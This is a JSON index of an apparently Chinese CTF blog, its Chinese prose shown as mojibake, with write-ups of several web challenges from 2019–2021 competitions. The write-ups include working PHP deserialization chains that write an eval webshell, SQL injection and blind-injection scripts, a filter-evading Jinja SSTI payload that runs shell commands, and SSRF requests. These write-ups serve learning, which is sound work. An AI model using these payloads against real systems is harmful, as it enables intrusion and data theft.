{"pages":[{"title":"æ ‡ç­¾","text":"","link":"/tags/index.html"},{"title":"åˆ†ç±»","text":"","link":"/categories/index.html"}],"posts":[{"title":"2020 æ–°æ˜¥çº¢åŒ…é¢˜1","text":"[2020 æ–°æ˜¥çº¢åŒ…é¢˜]1å¯ä»¥çœ‹åˆ°Bç±»ä¸­æœ‰ä¸€ä¸ªå±é™©å‡½æ•°file_put_contentsï¼Œåªè¦èƒ½æ§åˆ¶æ–‡ä»¶åå’Œæ–‡ä»¶å†…å®¹å°±å¯ä»¥å†™å…¥webshellã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127&lt;?phperror_reporting(0);class A { protected $store; protected $key; protected $expire; public function __construct($store, $key = 'flysystem', $expire = null) { $this-&gt;key = $key; $this-&gt;store = $store; $this-&gt;expire = $expire; } public function cleanContents(array $contents) { $cachedProperties = array_flip([ 'path', 'dirname', 'basename', 'extension', 'filename', 'size', 'mimetype', 'visibility', 'timestamp', 'type', ]); foreach ($contents as $path =&gt; $object) { if (is_array($object)) { $contents[$path] = array_intersect_key($object, $cachedProperties); } } return $contents; } public function getForStorage() { $cleaned = $this-&gt;cleanContents($this-&gt;cache); return json_encode([$cleaned, $this-&gt;complete]); } public function save() { $contents = $this-&gt;getForStorage(); $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); } public function __destruct() { if (!$this-&gt;autosave) { $this-&gt;save(); } }}class B { protected function getExpireTime($expire): int { return (int) $expire; } public function getCacheKey(string $name): string { // ä½¿ç¼“å­˜æ–‡ä»¶åéšæœº $cache_filename = $this-&gt;options['prefix'] . uniqid() . $name; if(substr($cache_filename, -strlen('.php')) === '.php') { die('?'); } return $cache_filename; } protected function serialize($data): string { if (is_numeric($data)) { return (string) $data; } $serialize = $this-&gt;options['serialize']; return $serialize($data); } public function set($name, $value, $expire = null): bool{ $this-&gt;writeTimes++; if (is_null($expire)) { $expire = $this-&gt;options['expire']; } $expire = $this-&gt;getExpireTime($expire); $filename = $this-&gt;getCacheKey($name); $dir = dirname($filename); if (!is_dir($dir)) { try { mkdir($dir, 0755, true); } catch (\\Exception $e) { // åˆ›å»ºå¤±è´¥ } } $data = $this-&gt;serialize($value); if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) { //æ•°æ®å‹ç¼© $data = gzcompress($data, 3); } $data = &quot;&lt;?php\\n//&quot; . sprintf('%012d', $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data; $result = file_put_contents($filename, $data); if ($result) { return $filename; } return null; }}if (isset($_GET['src'])){ highlight_file(__FILE__);}$dir = &quot;uploads/&quot;;if (!is_dir($dir)){ mkdir($dir);}unserialize($_GET[&quot;data&quot;]); æ–‡ä»¶åAç±»çš„keyå±æ€§ä½œä¸ºå‚æ•°ä¼ å…¥setå‡½æ•° keyå±æ€§ä¼ å…¥setæ–¹æ³•åä½œä¸º$nameä¼ å…¥getCachekeyæ–¹æ³•ï¼Œè¿”å›$filenameåä½œä¸ºfile_put_contentså‡½æ•°çš„æ–‡ä»¶åå‚æ•° Bç±»çš„getCacheKeyæ–¹æ³•ã€‚æ–‡ä»¶åç”±$this-&gt;options['prefix'] . uniqid() . $nameæ‹¼æ¥è€Œæˆï¼Œuniqid()ä¸ºéšæœºç”Ÿæˆçš„ä¸€ä¸²æ•°å­—ï¼ŒåŒæ—¶å–æœ€åå››ä½çœ‹æ˜¯å¦ç­‰äº.phpã€‚åªè¦åˆ©ç”¨linuxç›®å½•è§£æç‰¹æ€§ä¼ å…¥/../shell.php/.è¿™ç§å½¢å¼å³å¯ç»•è¿‡åç¼€åé™åˆ¶ æ–‡ä»¶å†…å®¹1.Aç±»çš„__destruct()æ–¹æ³•è§¦å‘saveæ–¹æ³• 2.Aç±»çš„saveæ–¹æ³•è°ƒç”¨setæ–¹æ³•ï¼Œä»¤storeå±æ€§ç­‰äºBç±»è§¦å‘setï¼Œå†™å…¥çš„æ–‡ä»¶å†…å®¹$contentç­‰äºgetForStorageæ–¹æ³•è¿”å›å€¼,we 3.Aç±»çš„getForStorageæ–¹æ³•ï¼Œ 4.Aç±»çš„cleanContentsæ–¹æ³•ï¼Œæ¥æ”¶ä¸€ä¸ªæ•°ç»„ä¸ºå‚æ•°ï¼Œarray_intersect_keyå–ä¸¤ä¸ªæ•°ç»„çš„å­é›†ï¼ŒæŠŠå®ƒä»¬çš„é”®å€¼äº¤æ¢åè¿”å›ï¼Œè¿™é‡Œå°±è¦æ±‚cacheå¿…é¡»ä¸ºä¸€ä¸ªæ•°ç»„ 5.Bç±»çš„serializeæ–¹æ³•ï¼Œè¿”å›$serialize($dara)ï¼Œå¯ä»¥ä½¿$this-&gt;options[â€˜serializeâ€™]ç­‰äºserialize 6.setæ–¹æ³•ä¸­æ–‡ä»¶å†…å®¹$dataè¢«æ‹¼æ¥ä¸Šäº†&lt;?php exit();ã€‚ç”±äºfile_put_contentsçš„ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥ä¸ºphpä¼ªåè®®ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è®¾ç½®file_put_contentsçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºphp://fliter/write=convert.base64-decodeï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºbase64ç¼–ç åçš„ä¸€å¥è¯ï¼Œè¿™æ ·å‰é¢çš„æ‹¼æ¥ä¸Šçš„&lt;?php exit();å°±ä¼šè¢«è½¬æ¢æˆä¹±ç ã€‚ cacheå±æ€§çš„å¤„ç†è¿‡ç¨‹ï¼Œæœ€ç»ˆä½œä¸ºæ–‡ä»¶å†…å®¹å‚æ•°ä¼ å…¥file_put_contents 1serialize(json_encode(cleanContents($this-&gt;cache))) åˆ©ç”¨æ„é€ exp 1234567891011121314151617181920212223242526272829&lt;?phpclass A{ protected $store; protected $key; protected $expire; public $cache =[]; public $complete = true; public function __construct () { $this-&gt;store = new B(); $this-&gt;key = '/../1.php/.'; $this-&gt;cache = ['dirname'=&gt;'aPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+']; }}class B{ public $options = [ 'serialize' =&gt; 'serialize', 'prefix' =&gt; 'php://filter/write=convert.base64-decode/resource=./uploads/', ];}$a = new A();echo urlencode(serialize($a));?&gt; æˆåŠŸå†™å…¥æ–‡ä»¶ æ‹¿åˆ°flag","link":"/2021/03/30/2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%981/"},{"title":"2019å¼ºç½‘æ¯webéƒ¨åˆ†å¤ç°","text":"éšä¾¿æ³¨å †å æ³¨å…¥ æµ‹è¯•æ—¶å‘ç°è¿‡æ»¤äº†ä¸€äº›å‡½æ•° 1preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); [ æŸ¥çœ‹æ•°æ®åº“ 11';show databases # [ æŸ¥çœ‹è¡¨åï¼Œå‘ç°ä¸¤å¼ è¡¨ 1919810931114514 words 1?inject=1';show tables from supersqli # [ è¡¨1919810931114514ä¸­å­˜åœ¨flagå­—æ®µ 11';show columns from `1919810931114514`;# [ ä½¿ç”¨handlerç»•è¿‡ 1?inject=1';handler `1919810931114514` open;handler `1919810931114514` read first;handler `1919810931114514`close # [ uploadååºåˆ—åŒ– æ³¨å†Œç”¨æˆ· [ è¿›å…¥åå‘ç°å¯ä»¥ä¸Šä¼ å›¾ç‰‡ [ ä¸‹è½½å¤‡ä»½æ–‡ä»¶www.tar.gz åœ¨cookieå¤„å‘ç°åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œæ¨æµ‹æ˜¯è¦åˆ©ç”¨ååºåˆ—åŒ–ã€‚ [ å…¨å±€æœç´¢unserializeï¼Œå®šä½åˆ°/web/controller/Index.php,ä»cookieä¸­è·å–basse64ç¼–ç åçš„userå€¼ç„¶åè¿›è¡Œååºåˆ—åŒ– [ /web/controller/Profile.phpçš„Profileç±»ä¸­è°ƒç”¨äº†copyå‡½æ•°ï¼Œå¯ä»¥é‡å‘½åæ–‡ä»¶ã€‚$this-&gt;filename_tmpå’Œ$this-&gt;filenameå‡å¯æ§ï¼Œå¯ä»¥ç»“åˆä¸Šä¼ å›¾ç‰‡åŠŸèƒ½ï¼Œè°ƒç”¨upload_imgæ–¹æ³•å°†ä¸Šä¼ åçš„å›¾ç‰‡æ–‡ä»¶å‘½åä¸ºphpæ–‡ä»¶ï¼Œç›´æ¥getshellã€‚ [ /web/controller/Register.phpä¸­çš„Registerç±»å­˜åœ¨__destructæ–¹æ³•ï¼Œåªè¦æŠŠcheckerèµ‹å€¼ä¸ºProfileç±»å³å¯è§¦å‘__callæ–¹æ³• [ Profileç±»ä¸­å­˜åœ¨__callæ–¹æ³•å’Œ__getæ–¹æ³•ï¼Œ__callæ–¹æ³•ä¸­å­˜åœ¨è°ƒç”¨å‡½æ•°çš„å¯èƒ½ï¼Œå‡½æ•°åä¸º$this-&gt;{$this-&gt;{$name}}ï¼Œè¿›å…¥__callæ–¹æ³•å$this-&gt;indexè®¿é—®ä¸å­˜åœ¨çš„å±æ€§ï¼Œä»è€Œè°ƒç”¨__getæ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨__getæ–¹æ³•ä¸­æŠŠ$this-&gt;indexèµ‹å€¼ä¸ºupload_imgï¼Œè¿™æ ·__callä¸­å³å¯è°ƒç”¨upload_imgã€‚exceptå±æ€§å¯æ§ï¼Œä»¤exceptå±æ€§ç­‰äº array(â€˜indexâ€™ =&gt; â€˜upload_imgâ€™)ï¼Œè¿™æ ·$this-&gt;{$this-&gt;{$name}}å°±ä¼šç­‰äº$this-&gt;indexç­‰äºupload_imgï¼Œä»è€Œèƒ½åœ¨__callæ–¹æ³•ä¸­è°ƒç”¨upload_imgå‡½æ•° [ æ„é€ expRegisterç±»ä¸­çš„__destruct()æ–¹æ³•-&gt;Profileç±»ä¸­çš„__call()æ–¹æ³•-&gt;Profileç±»ä¸­çš„__get()æ–¹æ³•-&gt;Profileç±»ä¸­çš„upload_img()æ–¹æ³• 123456789101112131415161718192021222324252627&lt;?phpnamespace app\\web\\controller;use think\\Controller;class Profile{ public $filename_tmp=&quot;./upload/a0e8e2b0d70d8e34d1bd3b1452e39848/30a17ed2359586e474712c283fa27ffb.png&quot;; public $filename=&quot;./upload/a0e8e2b0d70d8e34d1bd3b1452e39848/111.php&quot;; public $except=array('index'=&gt;'upload_img'); public $ext=true;}class Register{ public $checker; public function __construct($p) { $this-&gt;checker=$p; }}$a=new Profile();$b=new Register($a);echo urlencode(base64_encode(serialize($b)));?&gt; åˆ©ç”¨ä¸Šä¼ å›¾ç‰‡é©¬ [ åœ¨cookieçš„userå‚æ•°ä¸­å†™å…¥payload [ æ”¹åæˆåŠŸ [ smarthackerè„šæœ¬ç¼–å†™ ç›´æ¥ä¸‹è½½å¤‡ä»½æ–‡ä»¶å¼€å§‹åˆ†æ [ æ‰“å¼€åå‘ç°å¤§é‡ç–‘ä¼¼webshellï¼Œä½†æ˜¯å¤§éƒ½æ— æ³•åˆ©ç”¨ï¼Œç”±äºæ•°é‡é«˜è¾¾3000ä¸ªï¼Œé€ä¸ªåˆ†ææ˜¯ä¸å¯èƒ½çš„ï¼Œå› æ­¤åªèƒ½åˆ©ç”¨pythonè„šæœ¬æ„é€ è¯·æ±‚æµ‹è¯•webshellä¸­çš„å‚æ•°æ˜¯å¦å¯ç”¨ [ ç¼–å†™è„šæœ¬æµ‹è¯• 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import requestsimport osimport timeimport repatternget=re.compile(&quot;GET\\[\\'(.+?)\\'\\]&quot;)patternpost=re.compile(&quot;POST\\[\\'(.+?)\\'\\]&quot;)os.chdir('D:\\phpstudy_pro\\WWW\\ctf\\src')files=os.listdir('D:\\phpstudy_pro\\WWW\\ctf\\src')requests.adapters.DEFAULT_RETRIES = 5 session = requests.Session()session.keep_alive = Falsewebshellname=&quot;&quot;def get(): for filename in files: print(filename) index=11 with open(filename,'r') as f: result=patternget.findall(str(f.read())) print(result) for arg in result: index+=1 url='http://127.0.0.1/ctf/src/%s?%s=echo 955682789;' %(filename,arg) r=session.get(url) if '955682789' in r.text: print(&quot;webshell is %s:%s&quot; %(filename,arg)) webshellname=&quot;webshell is %s:%s&quot; %(filename,arg) break else: continue breakdef post(): for filename in files: print(filename) with open(filename,'r') as f: result=patternpost.findall(str(f.read())) print(result) for arg in result: url='http://127.0.0.1/ctf/src/%s' %filename data={arg:'echo 955682789;'} r=session.post(url=url,data=data) if '955682789' in r.text: print(&quot;webshell is %s:%s&quot; %(filename,arg)) webshellname=&quot;webshell is %s:%s&quot; %(filename,arg) break else: continue breakif __name__=='__main__': #post() get() æ‹¿åˆ°flag [","link":"/2021/03/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"},{"title":"2021 DASCTFä¸‰æœˆèµ›webæ€»ç»“","text":"BestDBunionæ³¨å…¥ å¼€å§‹å°±æç¤ºäº†sqlè¯­å¥ï¼Œå•å¼•å·å’Œç©ºæ ¼è¢«è¿‡æ»¤ï¼ŒåŒå¼•å·é—­åˆå³å¯ 1$sql = &quot;SELECT * FROM users WHERE id = '$query' OR username = \\&quot;$query\\&quot;&quot;; è¯»å–è¡¨å 1http://183.129.189.60:10005/?query=asd&quot;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),3%23 è¯»å–åˆ—å 1http://183.129.189.60:10005/?query=asd&quot;/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;f1agdas&quot;),3%23 è¯»å–f1agdasï¼Œå¾—çŸ¥flagåœ¨flag.txt 1http://183.129.189.60:10005/?query=asd%22/**/union/**/select/**/1,(select/**/group_concat(f1agdas)/**/from/**/f1agdas),3%23 ä½¿ç”¨load_Fileè¯»å–æ–‡ä»¶ï¼Œflag.txtè¢«è¿‡æ»¤ï¼Œæ”¹ä¸ºhexç¼–ç å³å¯ç»•è¿‡ 1http://183.129.189.60:10005/?query=asd&quot;/**/union/**/select/**/1,(select/**/hex(load_file(0x2F666C61672E747874))),3%23 è§£ç åå¾—åˆ°flagï¼ŒDASCTF{352f1504696639a0d71c2d36591d505b} baby_flasksstiï¼Œæºç ä¸­ç»™å‡ºäº†é»‘åå•ï¼Œå¯ä»¥ä½¿ç”¨joinè¿‡æ»¤å™¨å’Œunicodeæ•°å­—ç»•è¿‡ 12345678910111213&lt;!--Hi young boy!&lt;/br&gt;Do you like ssti?&lt;/br&gt;blacklist&lt;/br&gt; '.','[','\\'','&quot;',''\\\\','+',':','_',&lt;/br&gt; 'chr','pop','class','base','mro','init','globals','get',&lt;/br&gt; 'eval','exec','os','popen','open','read',&lt;/br&gt; 'select','url_for','get_flashed_messages','config','request',&lt;/br&gt; 'count','length','ï¼','ï¼‘','ï¼’','ï¼“','ï¼”','ï¼•','ï¼–','ï¼—','ï¼˜','ï¼™','0','1','2','3','4','5','6','7','8','9'&lt;/br&gt; &lt;/br&gt; --&gt; 123456789101112131415{%set a=dict(po=aa,p=aa)|join%} # pop{%set b=lipsum|string|list|attr(a)(ğŸ™ğŸ )%} # _{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%} # globals{%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%} # getitem{%set e=dict(o=cc,s=aa)|join%} # os{%set f=lipsum|string|list|attr(a)(ğŸ¡)%} # ç©ºæ ¼{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-ğŸ )%} # æ–œæ {%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%} # cat /flag{%set h=(a,dict(en=aa)|join|join)|join%} # popen{%set i=dict(re=aa,ad=aa)|join%} # read{%set z=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-ğŸ)%} #ç‚¹{%set j=(dict(ls=aa)|join,f,g,(dict(var=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%} #ls /var/www/flask{%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%}{{j}}#æœ€åæ‹¼æ¥èµ·æ¥#{{lipsum.__globals__['os'].popen('ls /var/www/flask').read()}} payload 1name={%set a=dict(po=aa,p=aa)|join%}{%set b=lipsum|string|list|attr(a)(ğŸ™ğŸ )%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{%set f=lipsum|string|list|attr(a)(ğŸ¡)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-ğŸ )%}{%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%}{%set h=(a,dict(en=aa)|join|join)|join%}{%set i=dict(re=aa,ad=aa)|join%}{%set z=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-ğŸ)%}{%set j=(dict(ls=aa)|join,f,g,(dict(var=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%}{%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%}{{j}} ez_loginindex.phpï¼Œå¼€å§‹çš„sessionå¯ä»¥ä½¿ç”¨session.upload_progressç»•è¿‡ https://www.freebuf.com/news/202819.html 123456789101112131415161718192021222324&lt;?php if(!isset($_SESSION)){ highlight_file(__FILE__); die(&quot;no session&quot;); } include(&quot;./php/check_ip.php&quot;); error_reporting(0); $url = $_GET['url']; if(check_inner_ip($url)){ if($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1); $output = curl_exec($ch); $result_info = curl_getinfo($ch); curl_close($ch); } }else{ echo &quot;Your IP is internal yoyoyo&quot;; } ?&gt; å‘ç°ç›®å½•ä¸‹å­˜åœ¨admin.phpï¼Œå¿…é¡»è¦æœ¬åœ°è®¿é—® æ„é€ ssrfè¯·æ±‚admin.php 1234567891011121314# coding=utf-8import ioimport requestsimport threadingsessid = 'flag'url = &quot;http://183.129.189.60:10015/?url=http://localhost/admin.php&quot;f = io.BytesIO(b'a' * 1024 * 50)session = requests.session()resp = session.post(url,data={'PHP_SESSION_UPLOAD_PROGRESS': 'x'},files={'file': ('tgao.txt', f)}, cookies={'PHPSESSID': sessid})print(resp.text) å‘ç°ä¸¤ä¸ªæ–‡ä»¶login_admin.phpï¼Œ/yuanma_f0r_eAZy_logon.zip 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt;&lt;title&gt;Admin Login&lt;/title&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;&lt;script type=&quot;application/x-javascript&quot;&gt; addEventListener(&quot;load&quot;, function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } &lt;/script&gt;&lt;meta name=&quot;keywords&quot; content=&quot;Flat Dark Web Login Form Responsive Templates, Iphone Widget Template, Smartphone login forms,Login form, Widget Template, Responsive Templates, a Ipad 404 Templates, Flat Responsive Templates&quot; /&gt;&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;&lt;!--/yuanma_f0r_eAZy_logon.zip--&gt;&lt;!--webfonts--&gt;&lt;link href=&quot;http://fonts.useso.com/css?family=PT+Sans:400,700,400italic,700italic|Oswald:400,300,700&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;http://fonts.useso.com/css?family=Exo+2&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;!--//webfonts--&gt;&lt;script src=&quot;http://ajax.useso.com/ajax/libs/jquery/1.11.0/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;$(document).ready(function(c) { $(&quot;.close&quot;).on(&quot;click&quot;, function(c){ $(&quot;.login-form&quot;).fadeOut(&quot;slow&quot;, function(c){ $(&quot;.login-form&quot;).remove(); }); }); });&lt;/script&gt; &lt;!--SIGN UP--&gt; &lt;h1&gt;Login&lt;/h1&gt;&lt;div class=&quot;login-form&quot;&gt; &lt;div class=&quot;close&quot;&gt; &lt;/div&gt; &lt;div class=&quot;head-info&quot;&gt; &lt;label class=&quot;lbl-1&quot;&gt; &lt;/label&gt; &lt;label class=&quot;lbl-2&quot;&gt; &lt;/label&gt; &lt;label class=&quot;lbl-3&quot;&gt; &lt;/label&gt; &lt;/div&gt; &lt;div class=&quot;clear&quot;&gt; &lt;/div&gt; &lt;div class=&quot;avtar&quot;&gt; &lt;img src=&quot;images/avtar1.png&quot; /&gt; &lt;/div&gt; &lt;form action=&quot;./login_admin.php&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;text&quot; name=&quot;username&quot; value=&quot;Username&quot; onfocus=&quot;this.value = &quot;&quot;;&quot; onblur=&quot;if (this.value == &quot;&quot;) {this.value = &quot;Username&quot;;}&quot; &gt; &lt;div class=&quot;key&quot;&gt; &lt;input type=&quot;password&quot; value=&quot;Password&quot; name=&quot;password&quot; onfocus=&quot;this.value = &quot;&quot;;&quot; onblur=&quot;if (this.value == &quot;&quot;) {this.value = &quot;Password&quot;;}&quot;&gt; &lt;/div&gt; &lt;/form&gt; &lt;div class=&quot;signin&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Login&quot; &gt; &lt;/div&gt;&lt;/div&gt; &lt;div class=&quot;copy-rights&quot;&gt; &lt;p&gt;Copyright &amp;copy; ez login aha?&lt;/a&gt;&lt;/p&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;?&gt; yuanma_f0r_eAZy_logon.zipä¸­åŒ…å«ä¸€ä¸ªse1f_Log3n.php se1lf_Log3n.php 1234567891011121314151617&lt;?phpinclude(&quot;./php/db.php&quot;);include(&quot;./php/check_ip.php&quot;);error_reporting(E_ALL);$ip = $_SERVER[&quot;REMOTE_ADDR&quot;];if($ip !== &quot;127.0.0.1&quot;){ exit();}else{ try{ $sql = 'SELECT `username`,`password` FROM `user` WHERE `username`= &quot;'.$username.'&quot; and `password`=&quot;'.$password.'&quot;;'; $result = $con-&gt;query($sql); echo $sql; }catch(Exception $e){ echo $e-&gt;getMessage(); } ($result-&gt;num_rows &gt; 0 AND $row = $result-&gt;fetch_assoc() AND $con-&gt;close() AND die(&quot;error&quot;)) OR ( ($con-&gt;close() AND die('Try again!') )); } å­˜åœ¨å¸ƒå°”ç›²æ³¨ï¼Œæ„é€ æ³¨å…¥è¯­å¥åç”¨ssrfè¯·æ±‚å³å¯ 1http://183.129.189.60:10015/?url=http://localhost//se1f_Log3n.php?username=admin'or 1=1%23password=admin è„šæœ¬ 123456789101112131415161718from urllib.parse import quoteimport requestsimport timeasc_str = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\\&quot;#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`{|}~&quot;mydata = {'PHP_SESSION_UPLOAD_PROGRESS':'1'}myfile = {'file':('1.txt','1')}mycookie = {'PHPSESSID':'jtq4q3fdfgnckcrd52a6nhf90a'}ip = 'http://183.129.189.60:10015/?url='flag = ''ses=requests.session()payload = 'http://localhost//se1f_Log3n.php?username=admin\\'and 1=1%23password=admin'url = ip + quote(payload)r = ses.post(url=url, data=mydata, files=myfile, cookies=mycookie)print(r.text) and 1=1 and 1=2è¿”å›ç»“æœä¸åŒ ç›²æ³¨è„šæœ¬ 1234567891011121314151617181920212223from urllib.parse import quoteimport requestsimport timeasc_str = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\\&quot;#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`{|}~&quot;mydata = {'PHP_SESSION_UPLOAD_PROGRESS':'mochu7'} myfile = {'file':('mochu7.txt','mochu7')}mycookie = {'PHPSESSID':'jtq4q3fdfgnckcrd52a6nhf90a'}ip = 'http://183.129.189.60:10015/?url='flag = ''ses=requests.session()for l in range(1,50): for s in asc_str: payload = 'http://localhost//se1f_Log3n.php?username=mochu\\'or ascii(mid((select flag from ctf.secret),{},1))={}%23password=mochu7'.format(l,ord(s)) url = ip + quote(payload) r = ses.post(url=url, data=mydata, files=myfile, cookies=mycookie) time.sleep(0.2) if 'correct?' in r.text: flag += s print(flag) else: pass å¾—åˆ°flag ez_serializeè°ƒç”¨å’ŒSplFileObjectå†…ç½®ç±»è¿›è¡Œååºåˆ—åŒ–ã€‚FilesystemIteratorç”¨äºéå†ç›®å½•æ–‡ä»¶ï¼ŒSplFileObjectç”¨äºè¯»å–æ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phperror_reporting(0);highlight_file(__FILE__);class A{ public $class; public $para; public $check; public function __construct() { $this-&gt;class = &quot;B&quot;; $this-&gt;para = &quot;ctfer&quot;; echo new $this-&gt;class ($this-&gt;para); } public function __wakeup() { $this-&gt;check = new C; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) { echo new $this-&gt;class ($this-&gt;para); } else die('bad hacker~'); }}class B{ var $a; public function __construct($a) { $this-&gt;a = $a; echo (&quot;hello &quot;.$this-&gt;a); }}class C{ function vaild($code){ $pattern = '/[!|@|#|$|%|^|&amp;|*|=|\\'|&quot;|:|;|?]/i'; if (preg_match($pattern, $code)){ return false; } else return true; }}if(isset($_GET['pop'])){ unserialize($_GET['pop']);}else{ $a=new A;} hello ctfer åˆ—å‡ºç›®å½•ä¸‹æ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass A{ public $class; public $para; public $check; public function __construct() { $this-&gt;class = &quot;FilesystemIterator&quot;; $this-&gt;para = &quot;/var/www/html/&quot;; //echo new $this-&gt;class ($this-&gt;para); }}class B{ var $a; public function __construct($a) { $this-&gt;a = $a; echo (&quot;hello &quot;.$this-&gt;a); }}class C{ function vaild($code){ $pattern = '/[!|@|#|$|%|^|&amp;|*|=|\\'|&quot;|:|;|?]/i'; if (preg_match($pattern, $code)){ return false; } else return true; }}$a=new A();echo urlencode(serialize($a)); å‘ç°ç›®å½•aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErEï¼Œç›®å½•ä¸‹å­˜åœ¨flag.php 1http://76863e29-3ca5-4471-ac1a-57b8f52336b7.machine.dasctf.com/?pop=O%3A1%3A%22A%22%3A3%3A{s%3A5%3A%22class%22%3Bs%3A18%3A%22FilesystemIterator%22%3Bs%3A4%3A%22para%22%3Bs%3A14%3A%22%2Fvar%2Fwww%2Fhtml%2F%22%3Bs%3A5%3A%22check%22%3BN%3B} å‘ç°ç›®å½•aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErEï¼Œç›®å½•ä¸‹å­˜åœ¨flag.php è¯»å–æ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass A{ public $class; public $para; public $check; public function __construct() { $this-&gt;class = &quot;SplFileObject&quot;; $this-&gt;para = &quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;; //echo new $this-&gt;class ($this-&gt;para); }}class B{ var $a; public function __construct($a) { $this-&gt;a = $a; echo (&quot;hello &quot;.$this-&gt;a); }}class C{ function vaild($code){ $pattern = '/[!|@|#|$|%|^|&amp;|*|=|\\'|&quot;|:|;|?]/i'; if (preg_match($pattern, $code)){ return false; } else return true; }}$a=new A();echo urlencode(serialize($a)); å‚è€ƒhttps://blog.csdn.net/mochu7777777/article/details/115276176 https://www.plasf.cn/articles/dasctf202103.html https://blog.csdn.net/rfrder/article/details/115272645 https://whoamianony.top/2021/03/29/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/MAR%20DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/","link":"/2021/04/08/2021-DASCTF%E4%B8%89%E6%9C%88%E8%B5%9Bweb%E6%80%BB%E7%BB%93/"},{"title":"2021çº¢æ˜è°·ctf webéƒ¨åˆ†å¤ç°","text":"easytpæŠ¥é”™å¾—åˆ°thinkphpç‰ˆæœ¬ä¸º3.2.3 å­˜åœ¨å¤‡ä»½æ–‡ä»¶www.zip æ§åˆ¶å™¨ä¸­å­˜åœ¨unserializeå‡½æ•°ï¼Œéœ€è¦åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ Thinkphp3.2.3ååºåˆ—åŒ–æ¼æ´ï¼ˆæ³¨å…¥&amp;æ–‡ä»¶è¯»å–ï¼‰ https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?phpnamespace Think\\Db\\Driver{ use PDO; class Mysql{ protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true // å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶ ); protected $config = array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;mysql&quot;, &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;, 